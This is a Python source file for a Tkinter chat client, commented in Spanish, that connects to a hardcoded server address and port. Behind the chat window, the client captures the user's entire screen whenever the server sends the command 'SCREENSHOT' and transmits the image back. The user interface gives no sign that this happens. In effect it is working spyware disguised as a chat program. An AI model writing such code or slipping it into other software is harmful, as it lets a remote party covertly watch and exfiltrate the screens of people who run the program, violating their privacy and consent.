import socket
import struct
from PIL import ImageGrab
import io
import tkinter as tk
from tkinter import scrolledtext
import threading
import time

SERVER_HOST = '172.168.0.107'
SERVER_PORT = 9685

def send_screenshot():
    # Capturar la pantalla
    screenshot = ImageGrab.grab()
    with io.BytesIO() as output:
        screenshot.save(output, format='JPEG')
        screenshot_data = output.getvalue()

    # Enviar la captura de pantalla al servidor
    try:
        client_socket.sendall("SCREENSHOT".encode())
        client_socket.sendall(struct.pack('>Q', len(screenshot_data)))
        client_socket.sendall(screenshot_data)
        print("Captura de pantalla enviada.")
    except Exception as e:
        print(f"Error al enviar captura de pantalla: {e}")

# Crear un socket TCP/IP
client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Intentar conectarse al servidor
connected = False
while not connected:
    try:
        client_socket.connect((SERVER_HOST, SERVER_PORT))
        connected = True
    except ConnectionRefusedError:
        print('No se pudo conectar al servidor. Reintentando en 1 segundo...')
        time.sleep(1)

print('Conexión establecida con el servidor.')

def receive_messages():
    while True:
        try:
            message = client_socket.recv(1024).decode(errors='ignore')
            if message == 'SCREENSHOT':
                send_screenshot()
            elif message:
                chat_box.config(state=tk.NORMAL)
                chat_box.insert(tk.END, message + '\n')
                chat_box.config(state=tk.DISABLED)
                chat_box.see(tk.END)
        except Exception as e:
            print(f"Error al recibir mensajes: {e}")
            client_socket.close()
            break

def send_message(event=None):
    message = message_entry.get()
    if message:
        client_socket.send(message.encode())
        chat_box.config(state=tk.NORMAL)
        chat_box.insert(tk.END, f"Tú: {message}\n")
        chat_box.config(state=tk.DISABLED)
        chat_box.see(tk.END)
        message_entry.delete(0, tk.END)

# Crear ventana de la interfaz gráfica
root = tk.Tk()
root.title("Chat Cliente")

# Área de mensajes del chat
chat_box = scrolledtext.ScrolledText(root, width=40, height=10, state=tk.DISABLED)
chat_box.pack(padx=10, pady=10)

# Entrada de mensaje
message_entry = tk.Entry(root, width=30)
message_entry.pack(padx=10, pady=(0, 10))
message_entry.bind("<Return>", send_message)

# Botón para enviar mensaje
send_button = tk.Button(root, text="Enviar", command=send_message)
send_button.pack(pady=(0, 10))

# Iniciar hilo para recibir mensajes del servidor
receive_thread = threading.Thread(target=receive_messages)
receive_thread.start()

# Función para cerrar la conexión cuando se cierra la ventana
def on_closing():
    client_socket.close()
    root.destroy()

# Configurar la acción al cerrar la ventana
root.protocol("WM_DELETE_WINDOW", on_closing)

# Ejecutar la interfaz gráfica
root.mainloop()